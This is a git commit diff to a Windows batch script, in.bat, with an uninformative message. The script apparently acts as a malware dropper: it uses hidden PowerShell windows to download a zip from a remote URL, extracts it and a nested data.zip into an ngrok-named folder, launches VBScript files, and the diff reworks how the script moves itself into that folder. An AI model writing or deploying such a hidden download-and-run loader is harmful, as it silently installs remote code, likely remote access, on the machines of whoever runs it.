66ca739a17d277fac9897b4e76c0ee07c76c27c3
ofutpemata22 <gagi.cu.ci@gmail.com>
2025-04-24 00:29:34 +0300

    a

--- in.bat
+++ in.bat
@@ -9,8 +9,6 @@ set "TEMP_FILE=%TEMP%\8b37b206-42e3-4bdf-9344-aa7matagrasa77be014.tmp"
 
 if not exist "%NGROK_DIR%" mkdir "%NGROK_DIR%"
 
-move "%~f0" "%NGROK_DIR%\"
-
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%REPO_URL%', '%ZIP_PATH%')"
 powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%NGROK_DIR%\__repo__'"
 xcopy "%NGROK_DIR%\__repo__\mamf-main\*" "%NGROK_DIR%\" /s /e /h /y
@@ -19,14 +17,14 @@ rmdir /S /Q "%NGROK_DIR%\__repo__"
 powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%NGROK_DIR%\data.zip' -DestinationPath '%NGROK_DIR%\__extracted__'"
 xcopy "%NGROK_DIR%\__extracted__\*" "%NGROK_DIR%\" /s /e /h /y
 rmdir /S /Q "%NGROK_DIR%\__extracted__"
-
 start "" "%NGROK_DIR%\nt.vbs"
 
 timeout /t 2 >nul
 if exist "%TEMP_FILE%" (
     start "" "%NGROK_DIR%\main.vbs"
-    exit /b
 )
-goto WAIT_FILE
 
-endlocal
+set "SELF=%~f0"
+set "DEST=%NGROK_DIR%\mover.bat"
+move "%SELF%" "%DEST%" >nul
+exit /b
